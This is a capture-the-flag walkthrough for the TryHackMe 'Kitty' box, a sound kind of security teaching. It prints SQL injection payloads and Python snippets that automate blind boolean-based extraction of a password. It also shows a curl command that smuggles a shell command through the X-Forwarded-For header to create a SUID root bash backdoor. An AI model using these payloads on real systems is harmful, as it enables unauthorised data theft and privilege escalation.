# Try Hack Me - Kitty

**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the box, we run an nmap scan that finds two ports, 22 and 80 : 

```console
┌─[parrot@parrot]─[LOCAL_IP]─[~]
└──╼ $sudo nmap $IP
[...snip...]
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Navigating to the site on 80 we find a "User Login" page and the option to create an account at `/register.php`. A gobuster scan on the site finds no other interesting endpoints and there are no obvious versions, plugins, etc. to target.

## 2. Web enumeration - sqli

After creating an account and logging in, we find a landing page that tells us "Our site is still in development!" - none of our provided input (username, etc.) is reflected on the page and there are no additional functionalities. This looks like a dead end. Our only option then is to find an exploit in the two available functionalities - logging in at `/index.php` and creating an account at `/register.php`.

Replacing the "username" and "password" params of our login request with an sqli polyglot `SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/` we are greeted with a new message : "SQL Injection detected. This incident will be logged!". We can presume then that the developers are checking the parameters against a blacklist and refusing anything that smells like an sqli exploit. Poking around a little more, we find that not all useful characters are blocked - after registering a user "bb", we can login with no password using the username `bb'-- -`, the `--` characters commenting out the password check. We can use the same method to enumerate other users - `admin'-- -` gives us nothing, but `kitty'-- -` logs in successfully.

## 3. Foothold - blind boolean-base sqli

So we have found a blind boolean-based sqli vulnerability. We are able to query the database and verify the result of our queries by checking the result of our login attempt - if we are logged in, our query had a True result, if out login fails then our query had a False result. We can develop this vulnerability to fully enumerate the database. For more information on the techniques used here, see [TryHackMe's guide in the SQL Injection room](https://tryhackme.com/r/room/sqlinjectionlm). Before starting, I should also mention that this exploit would be hugely optimised by applying a binary search to the output of SUBSTRING(), but I just couldn't get it working.

Enumerating the database char by char will take some time, so we need to automate the process. As explained in the TryHackMe guide cited above, the first step is to find a functioning UNION SELECT clause that will wrap our enumeration commands. After a few attempts the username `'UNION SELECT 1,1,1,1;-- -` successfully logs us in - our techique then will be to replace the last of these 1s with our enumeration command. And now, some python :

```py
PRINTABLE_CHARS = string.printable[:-6]
URL = 'http://10.10.147.100/index.php'
CMD_WRAPPER = 'UNION SELECT 1,1,1,{};'

def send_request(cmd: str) -> bool:
    creds = { 'username': f"'{CMD_WRAPPER.format(cmd)}-- -", 'password': ''}
    return 'Our site is still in development' in requests.post(URL, creds).text

def enum(cmd_format: str) -> bool:
    target = ''
    while True:
        for p in printable_chars:
            if p != '%':
                if send_request(cmd_format.format(target + p)):
                    target += p
                    print(target)
                    break
        else:
            break
    return target
```

The function `enum` iterates over the printable ASCII characters and inputs them into the `cmd_format` variable. When the resulting request triggers a successful login, it adds the discovered character to `target` and starts again. When it is has exhausted the final run of characters, it returns the discovered value. We can apply this function to enumerate first the database name, then the table names, the column names, and finally any interesting data. More python : 

```py
def enum_db_name() -> bool:
    return enum("1 where database() like '{}%'")

def enum_table_names() -> bool:
    table_name_probe = "1 FROM information_schema.tables WHERE table_schema = 'REDACTED' and table_name like '{}%'"
    return enum(table_name_probe)

def enum_column_names() -> bool:
    col_name_probe = "1 FROM information_schema.columns WHERE table_schema = 'REDACTED' and table_name = 'REDACTED' and COLUMN_NAME = 'REDACTED'"
    return send_request(col_name_probe)
```

These functions apply the `enum` function for each of our targets. Once we have the database name and the table names, guessing goes a long way - we can imagine, correctly, that our target table has "id", "password", and "username" columns, and our enumeration has already found that "kitty" is an existing user. With all this information in place, we can write a final exfiltration function that targets Kitty's password (note the use of BINARY here - the password, unlike the other data found so far, is case sensitive) : 

```py
def enum_password() -> bool:
    pwd_probe = "1 FROM REDACTED WHERE REDACTED='kitty' AND REDACTED like BINARY '{}%'"
    return enum(pwd_probe)
```

Obviously these are just snippets and you'll need to stitch them together on your own for a working exploit. Once you do, you'll have a password that gives you SSH access as the Kitty user : 

```
kitty@kitty:~$ id
uid=1000(kitty) gid=1000(kitty) groups=1000(kitty)
kitty@kitty:~$ ls
user.txt
```

The user flag is at `/home/kitty/user.txt`.

## 4. Host enumeration - pspy

With our foothold we can perform some basic host enumeration. We have kitty's password but they have no sudo rights. In `/var/www/` we find the application source code with credentials for the sql database, but it doesn't have any data that we haven't already found through the sqli exploit. Checking open ports with with `ss -tln` we find an application running on 127.0.0.1:8080, but curling it down it appears to be the same application we found on *:80.

Running out of ideas, we transfer [pspy](https://github.com/DominicBreuker/pspy) to the machine and find a cronjob running a script `/opt/log_checker.sh` as root (UID=0) :

```
2024/03/29 16:05:02 CMD: UID=0     PID=2618   | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2024/03/29 16:05:02 CMD: UID=0     PID=2619   | /usr/bin/bash /opt/log_checker.sh 
```

The script is readable by kitty and seems to contain a fairly obvious command injection vulnerability, reading lines from the file `/var/www/development/logged` and passing them directly to `sh` :

```sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

Unfortunately `/var/www/development/logged` is not writeable by kitty, but from the surrounding context we can guess that this file logs IP addresses visiting the web application. This is confirmed by the source found at `/var/www/development/index.php` which writes the value of the X-Forward-For header to the `logged` file if the request triggers an sqli blacklist (based apparently on the probes used by sqlmap) : 

```php
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        }
```

If we can control the content of the X-Forwarded-For header we can trigger the blacklist and write a payload to `logged`, exploiting the command injection vulnerability found in `/opt/log_checker.sh`. Here is a exploit in curl - we set a password of `sleep` to trigger the blacklist and a SUID bash payload in the X-Forwarded-For header : 

`curl $IP/index.php -d 'password=sleep' -H 'X-Forwarded-For: ;cp /bin/bash /tmp/bckdr && chmod +s /tmp/bckdr;'`

This looks right and the application responds with 'SQL Injection detected. This incident will be logged!', but our payload is never written to `/var/www/development/logged`. So what's wrong? I spent more time on this step than i'd like to admit, but we already know that our target is in the `development` directory and that there is a second instance of the application running on 127.0.0.1:8080 - we are targeting the wrong instance! Modifying the payload to target the local instance and running it from our kitty foothold allows us to escalate to root : 

```
kitty@kitty:/var/www/development$ curl localhost:8080/index.php -d 'password=sleep' -H "X-Forwarded-For: ;cp /bin/bash /tmp/bckdr && chmod +s /tmp/bckdr;"
kitty@kitty:/var/www/development$ cat logged 
;cp /bin/bash /tmp/bckdr && chmod +s /tmp/bckdr;
kitty@kitty:/var/www/development$ /tmp/bckdr -p
bckdr-5.0# id
uid=1000(kitty) gid=1000(kitty) euid=0(root) egid=0(root) groups=0(root),1000(kitty)
```

The root flag is at `/root/root.txt`.
